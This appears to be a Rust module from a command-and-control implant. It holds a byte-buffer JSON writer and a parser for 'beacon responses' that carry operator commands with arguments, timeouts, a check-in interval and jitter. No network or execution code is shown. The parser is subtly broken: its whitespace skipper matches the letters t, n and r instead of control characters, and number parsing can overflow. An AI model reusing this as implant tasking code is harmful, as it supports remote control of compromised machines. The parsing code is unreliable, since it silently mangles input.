// Lightweight JSON builder that writes directly into a byte buffer
pub struct JsonWriter {
    buf: Vec<u8>,
    first: bool, // trach comma for object fields
}

impl JsonWriter {
    pub fn new() -> Self {
        Self { buf: Vec::with_capacity(512), first: true }
    }

    pub fn begin_object(&mut self) {
        self.buf.push(b'{');
        self.first = true;
    }

    pub fn end_object(&mut self) {
        self.buf.push(b'}');
        self.first = false;
    }

    fn comma(&mut self) {
        if !self.first {
            self.buf.push(b',');
        }
        self.first = false;
    }

    fn write_key(&mut self, key: &str) {
        self.comma();
        self.buf.push(b'"');
        self.buf.extend_from_slice(key.as_bytes());
        self.buf.push(b'"');
        self.buf.push(b':');
    }

    pub fn key_str(&mut self, key: &str, value: &str) {
        self.write_key(key);
        self.buf.push(b'"');
        // Excape special characters
        for &b in value.as_bytes() {
            match b {
                b'"' => {
                    self.buf.push(b'\\');
                    self.buf.push(b'"');
                }
                b'\\' => {
                    self.buf.push(b'\\');
                    self.buf.push(b'\\');
                }
                b'\n' => {
                    self.buf.push(b'\\');
                    self.buf.push(b'n');
                }
                b'\r' => {
                    self.buf.push(b'\\');
                    self.buf.push(b'r');
                }
                b'\t' => {
                    self.buf.push(b'\\');
                    self.buf.push(b't');
                }
                _ if b < 0x20 => {
                    // control characters: \u00XX
                    self.buf.extend_from_slice(b"\\u00");
                    let hi = b >> 4;
                    let lo = b & 0x0F;
                    self.buf.push(if hi < 10 { b'0' + hi } else { b'a' + hi - 10 });
                    self.buf.push(if lo < 10 { b'0' + lo } else { b'a' + lo - 10 });
                }
                _ => self.buf.push(b),
            }
        }
        self.buf.push(b'"');
    }

    pub fn key_u32(&mut self, key: &str, value: u32) {
        self.write_key(key);
        self.write_u64(value as u64);
    }

    pub fn key_i64(&mut self, key: &str, value: i64) {
        self.write_key(key);
        if value < 0 {
            self.buf.push(b'-');
            self.write_u64((!value as u64).wrapping_add(1));
        } else {
            self.write_u64(value as u64);
        }
    }

    pub fn key_object(&mut self, key: &str) {
        self.write_key(key);
        self.buf.push(b'{');
        self.first = true;
    }

    fn write_u64(&mut self, mut value: u64) {
        if value == 0 {
            self.buf.push(b'0');
            return;
        }
        let mut digits = [0u8; 20];
        let mut i = 0;
        while value > 0 {
            digits[i] = b'0' + (value % 10) as u8;
            value /= 10;
            i += 1;
        } 
        while i > 0 {
            i -= 1;
            self.buf.push(digits[i]);
        }
    }

    pub fn finish(self) -> Vec<u8> {
        self.buf
    }
}

// Minimal pull style JSON parser
pub struct JsonReader<'a> {
    data: &'a [u8],
    pos: usize,
}

pub struct ParsedCommand {
    pub id: String,
    pub command_type: String,
    pub args: Vec<String>,
    pub timeout: Option<u64>
}

pub struct BeaconResponse {
    pub commands: Vec<ParsedCommand>,
    pub interval: Option<u64>,
    pub jitter: Option<u8>,
}

impl<'a> JsonReader<'a> {
    pub fn new(data: &'a [u8]) -> Self {
        Self { data, pos: 0 }
    }

    fn skip_whitespace(&mut self) {
        while self.pos < self.data.len() {
            match self.data[self.pos] {
                b' ' | b't' | b'n' | b'r' => self.pos += 1,
                _ => break,
            }
        }
    }

    fn peek(&self) -> Option<u8> {
        if self.pos < self.data.len() {
            Some(self.data[self.pos])
        } else {
            None
        }
    }

    fn advance(&mut self) {
        if self.pos < self.data.len() {
            self.pos += 1;
        }
    }

    fn expect(&mut self, ch: u8) -> bool {
        self.skip_whitespace();
        if self.peek() == Some(ch) {
            self.advance();
            true
        } else {
            false
        }
    }

    fn read_string(&mut self) -> Option<String> {
        self.skip_whitespace();
        if !self.expect(b'"') {
            return None;
        }

        let mut s = String::new();
        while self.pos < self.data.len() {
            let b = self.data[self.pos];
            self.pos += 1;
            if b == b'"' {
                return Some(s);
            }   
            if b == b'\\' && self.pos < self.data.len() {
                let esc = self.data[self.pos];
                self.pos += 1;
                match esc {
                    b'"' => s.push('"'),
                    b'\\' => s.push('\\'),
                    b'n' => s.push('\n'),
                    b'r' => s.push('\r'),
                    b't' => s.push('\t'),
                    _ => { s.push('\\'); s.push(esc as char); }
                }
            } else {
                s.push(b as char);
            }
        }
        None // unterminated string
    }

    // Read a JSON number (unsigned integer)
    fn read_number(&mut self) -> Option<u64> {
        self.skip_whitespace();
        let mut val: u64 = 0;
        let mut found = false;
        while self.pos < self.data.len() {
            let b = self.data[self.pos];
            if b >= b'0' && b <= b'9' {
                val = val * 10 + (b - b'0') as u64;
                self.pos += 1;
                found = true
            } else {
                break;
            }
        }
        if found {
            Some(val) 
        } else {
            None
        }
    }

    fn skip_value(&mut self) {
        self.skip_whitespace();
        match self.peek() {
            Some(b'"') => { self.read_string(); }
            Some(b'{') => { self.skip_object(); }
            Some(b'[') => { self.skip_array(); }
            Some(b't') | Some(b'f') | Some(b'n') => {
                // true/false/null
                while self.pos < self.data.len() {
                    match self.data[self.pos] {
                        b'a'..=b'z' => self.pos += 1,
                        _ => break,
                    }
                }
            }
            Some(b'-') => { 
                self.advance();
                self.read_number();
            }
            Some(b'0'..=b'9') => { self.read_number(); }
            _ => {}
        }

    } 

    fn skip_object(&mut self) {
        if !self.expect(b'{') { return }
        if self.expect(b'}') { return }
        loop {
            self.read_string(); // key
            self.expect(b':');
            self.skip_value();
            if !self.expect(b',') { break }
        }
        self.expect(b'}');
    }

    fn skip_array(&mut self) {
        if !self.expect(b'[') {
            return
        }
        if self.expect(b']') {
            return;
        }
        loop {
            self.skip_value();
            if !self.expect(b',') {
                break;
            }
        }
        self.expect(b']');
    }

    // Parse a string array like ["a", "r", "i", "a"]
    fn read_string_array(&mut self) -> Vec<String> {
        let mut result = Vec::new();
        self.skip_whitespace();
        if !self.expect(b'[') {
            return result;
        }
        self.skip_whitespace();
        if self.peek() == Some(b']') {
            self.advance();
            return result;
        }

        loop {
            if let Some(s) = self.read_string() {
                result.push(s);
            }
            if !self.expect(b',') {
                break;
            }
        }
        self.expect(b']');
        result
    }

    // Parse a single command object
    fn read_command(&mut self) -> Option<ParsedCommand> {
        if !self.expect(b'{') {
            return None;
        }

        let mut cmd = ParsedCommand {
            id: String::new(),
            command_type: String::new(),
            args: Vec::new(),
            timeout: None,
        };

        loop {
            self.skip_whitespace();
            if self.peek() == Some(b'}') {
                self.advance();
                break;
            }        

            let key = self.read_string()?;
            self.expect(b':');

            match key.as_str() {
                "id" => cmd.id = self.read_string().unwrap_or_default(),
                "type" => cmd.command_type = self.read_string().unwrap_or_default(),
                "args" => cmd.args = self.read_string_array(),
                "timeout" => {
                    self.skip_whitespace();
                    if self.peek() == Some(b'n') {
                        self.skip_value(); // skip "null"
                    } else {
                        cmd.timeout = self.read_number();
                    }
                }
                _ => self.skip_value(),
            }

            self.expect(b',');
        }

        Some(cmd)
    }

    pub fn parse_beacon_response(&mut self) -> Option<BeaconResponse> {
        if !self.expect(b'{') {
            return None;
        }

        let mut res = BeaconResponse {
            commands: Vec::new(),
            interval: None,
            jitter: None
        };

        loop {
            self.skip_whitespace();
            if self.peek() == Some(b'}') {
                self.advance();
                break;
            }

            let key = self.read_string()?;
            self.expect(b':');

            match key.as_str() {
                "commands" => {
                    if self.expect(b'[') {
                        self.skip_whitespace();
                        if self.peek() != Some(b']') {
                            loop {
                                if let Some(cmd) = self.read_command() {
                                    res.commands.push(cmd);
                                }
                                if !self.expect(b',') {
                                    break;
                                }
                            }
                            self.expect(b']');
                        }
                    }
                }
                "interval" => {
                    self.skip_whitespace();
                    if self.peek() == Some(b'n') {
                        self.skip_value();
                    } else {
                        res.interval = self.read_number();
                    }
                }
                "jitter" => {
                    self.skip_whitespace();
                    if self.peek() == Some(b'n') {
                        self.skip_value();
                    } else {
                        res.jitter = self.read_number().map(|v| v as u8);
                    }
                }
                _ => self.skip_value(),
            }

            self.expect(b',');
        }

        Some(res)
    }
}
